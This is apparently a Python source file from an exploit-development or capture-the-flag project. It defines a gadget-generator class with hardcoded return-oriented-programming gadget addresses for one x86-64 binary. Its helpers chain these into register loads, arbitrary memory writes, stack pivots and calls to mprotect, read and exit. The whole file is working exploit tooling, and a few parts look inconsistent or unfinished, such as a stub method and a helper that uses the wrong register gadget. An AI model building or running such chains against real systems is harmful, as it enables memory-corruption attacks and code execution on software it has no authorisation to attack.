#!/usr/bin/env python3

from exploiterTemplate import exploiterTemplate
from json.tool import main

ea_data = 0x00000000006C1060

derefer_rax_rax = 0x000000000048fcf0 # mov rax, qword ptr [rax] ; add rsp, 8 ; ret
push_rcx        = 0x0000000000406F03 
pop_rax         = 0x000000000044db34
pop_rsp         = 0x0000000000463C64 # pop rsp ; ret
pop_rbp         = 0x0000000000419E7F # pop rbp ; ret
main_addr       = 0x0000000000401383 # push rbp ; mov rbp, rsp
mprotect_addr   = 0x0000000000435690 
read_addr       = 0x0000000000434B20
exit_addr       = 0x0000000000434180
nop_gadet       = 0x0000000000408B87
cmov_rax_rdx    = 0x000000000048D057
xchg_eax_esp    = 0x000000000040037f
add_eax_edi_g   = 0x000000000041C673
mov_eax_esp     = 0x00000000004236DB
xchg_eax_ebx    = 0x0000000000459339
pop_rbx         = 0x000000000040B7CE
xchg_eax_edi    = 0x00000000004aca10
dec_rax_g       = 0x000000000433613
inc_rax_g       = 0x0000000000463b90
imul_esi_edx    = 0x00000000046491E
pop_rcx         = 0x00000000004b8f17
mov_edx_eax     = 0x000000000473C32 # edx, eax ; sub edx, ecx ; mov eax, edx ; ret
pop_rdx         = 0x0000000004560B4
add_eax_esi     = 0x0000000000464921
add_rax_3       = 0x0000000000463ba0
add_rax_rcx_g   = 0x00000000004232E0

class metaGadetGenerator:
    def __init__(self, exp : exploiterTemplate) -> None:
        self.exp = exp

    def get_num_of_opcodes(self):
        return self.exp.numOfOps

    def ret2_exit(self, exit_code):
        self.rdi_equ(exit_code)

        self.exp.add_gadet(exit_addr)

    def add_eax_edi(self):
        self.exp.add_gadet(add_eax_edi_g)

    def ret2_read(self, fd, buf, count):
        self.rdi_equ(fd)
        self.rsi_equ(buf)
        self.rdx_equ(count)

        self.exp.add_gadet(read_addr)

    def ret2_mprotect(self, addr, _len, prot):
        self.rdi_equ(addr)
        self.rsi_equ(_len)
        self.rdx_equ(prot)

        self.exp.add_gadet(mprotect_addr)

    def dec_rax(self):
        self.exp.add_gadet(dec_rax_g)

    def inc_rax(self):
        self.exp.add_gadet(inc_rax_g)

    def esi_equ_edx(self):
        self.rsi_equ(1)
        self.exp.add_gadet(imul_esi_edx)

    def signed_multiply_esi_edx(self):
        self.exp.add_gadet(imul_esi_edx)

    def rbp_equ(self, val):
        self.exp.add_gadet(pop_rbp) # pop rbp ; ret
        self.exp.add_gadet(val)

    def goto_main(self):
        self.exp.add_gadet(main_addr)

    def rsp_equ(self, val):
        self.exp.add_gadet(pop_rsp) # pop rsp ; ret
        self.exp.add_gadet(val)

    def add_rax_3(self):
        self.exp.add_gadet(0x0000000000463ba0)

    def add_rax_2(self):
        self.exp.add_gadet(0x0000000000463b87)

    def add_rax_8(self):
        self.add_rax_3()
        self.add_rax_3()
        self.add_rax_2()

    def add_rax_rcx(self):
        self.exp.add_gadet(add_rax_rcx_g)

    def add_rax_n(self, n):
        self.rcx_equ(n)
        self.add_rax_rcx()

    def mov_rcx_rax(self, pre):
        self.ex_write_what_where(rsi_where=pre.TEMP1)
        self.rdi_equ(pre.TEMP1)
        self.rdx_equ(pre.TRASH1)
        self.exp.add_gadet(0x000000000040F170) # mov rcx, qword ptr [rdi] ; mov qword ptr [rdx], rcx ; ret


    def rbx_equ(self, val):
        self.exp.add_gadet(pop_rbp)
        self.exp.add_gadet(val)

    # Side-Effect: Changes rbx
    def mov_rsi_rax(self, pre):
        self.mov_rcx_rax(pre)
        
        # Save rax
        self.ex_write_what_where(rsi_where=pre.TEMP1)
        self.rax_equ(256)
        
        # Set eflags to 0
        self.sub_rax_1()

        # Prepare rdx for variable
        self.exp.add_gadet(0x000000000040DDF8) # mov rsi, rcx ; jbe ...
        self.exp.add_gadet(0x1122334455667788) # padding for pop rbx
        # movzx eax, byte ptr [rdx] ; pop rbx ; ret

        # finally restore rax
        self.read_toRAX(pre.TEMP1)

    def marker(self):
        self.exp.add_gadet(0x000000000046452F)

    def sub_rax_1(self):
        self.exp.add_gadet(0x0000000000433613)

    def sub_rax_n(self, n):
        for x in range(n):
            self.sub_rax_1()

    def ex_write_what_where(self, rax_what=None, rsi_where=None):
        if rsi_where is not None:
            self.rsi_equ(rsi_where)

        if rax_what is not None:
            self.rax_equ(rax_what)

        self.exp.add_gadet(0x0000000000470f11) # mov qword ptr [rsi], rax ; ret

    def rdi_equ(self, val):
        self.exp.add_gadet(0x0000000000401b73)
        self.exp.add_gadet(val)

    def rdx_equ(self, val):
        self.exp.add_gadet(0x0000000000437A85)
        self.exp.add_gadet(val)

    def test_value(self, addr):
        # Read variable value from addr
        self.rax_equ(addr)
        self.exp.add_gadet(derefer_rax_rax)
        
        # set ZF acordingly if *addr == 0
        self.add_rax_2()
        self.sub_rax_1()
        self.sub_rax_1()

    def test_rax_rax(self):
        # set ZF acordingly if RAX == 0
        self.add_rax_2()
        self.sub_rax_1()
        self.sub_rax_1()

    def cond_mov_rax_rdx(self):
        self.exp.add_gadet(cmov_rax_rdx)
        
    def add_eax_esi(self):
        self.exp.add_gadet(add_eax_esi)

    def rax_equ(self, val):
        self.exp.add_gadet(0x000000000044db34) # pop rax ; ret
        self.exp.add_gadet(val)


    def rsi_equ(self, val):
        self.exp.add_gadet(0x0000000000401c87) # pop rsi ; ret
        self.exp.add_gadet(val)

    def rcx_equ(self, val):
        self.exp.add_gadet(pop_rcx)
        self.exp.add_gadet(val)

    # Side-Effects:
    #   Zeros ECX
    def edx_equ_eax(self):
        self.rcx_equ(0)
        self.exp.add_gadet(mov_edx_eax)

    def qword_convert(self, ea_start, position):
        return ea_start + position * 8


    def write_what_where(self, ea, value):
        self.rsi_equ(ea)             
        self.rax_equ(value)

        self.exp.add_gadet(0x0000000000470f11)


    def write_what_where_RAX(self, ea):
        self.rsi_equ(ea)             

        self.exp.add_gadet(0x0000000000470f11)


    def add_eax_to_ebx(self):
        self.exp.add_gadet(0x0000000000474f21) # add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret

    def exchange_eax_edi(self):
        self.exp.add_gadet(xchg_eax_edi)

    def exchange_eax_ebx(self):
        self.exp.add_gadet(0x0000000000459339) # xchg eax, ebx ; ret


    def follow_rax_rax(self):
        global derefer_rax_rax
        
        self.exp.add_gadet(derefer_rax_rax)
        # Add padding for add rsp
        self.exp.add_gadet(0x0000000000000000)

    def exchange_eax_esp(self):
        self.exp.add_gadet(xchg_eax_esp)

    def read_toRAX(self, ea):
        global derefer_rax_rax

        self.rax_equ(ea)
        self.exp.add_gadet(derefer_rax_rax)
        # Add padding for add rsp
        self.exp.add_gadet(0x0000000000000000)


    # 32 Bit
    # Side effects:
    #   Zeros R12
    def eax_equ_esp(self):
        self.exp.add_gadet(mov_eax_esp)

        # Add padding for the pop r12
        self.exp.add_gadet(0x0000000000000000)


    # 32 Bit
    # Params:
    #           EAX - jump offset
    def rsp_add_immediate_rax(self):
        '''
        self.exp.add_gadet(xchg_eax_esp)

        self.rdi_equ(offset)
        self.exp.add_gadet(add_eax_edi)

        self.exp.add_gadet(xchg_eax_esp)
        '''

        # Save 32 first bits for computation
        self.exp.add_gadet(mov_eax_esp)
        self.exp.add_gadet(xchg_eax_ebx)

        # ebx holds 32 LSB of RSP


    # 32 Bit
    def add_rsp(self, offset):
        # Set to RDI to jump offset
        self.rdi_equ(offset)

        # Save 32 first bits for computation
        self.eax_equ_esp()
        self.add_eax_edi()

        # Exchange EAX with ESP after calculation
        self.exchange_eax_esp()


    # 32 Bit
    # Params:
    #           EAX - jump offset
    def rsp_add_immediate_rdi(self):
        # Save 32 first bits for computation
        self.eax_equ_esp()
        self.add_eax_edi()

        # Exchange EAX with ESP after calculation
        self.exchange_eax_esp()


    # Jumps to offset if RAX == RBX
    def jump_if_equal(self, offset, cell_ea):
        pass


    def finalize(self):        
        self.exp.finish()
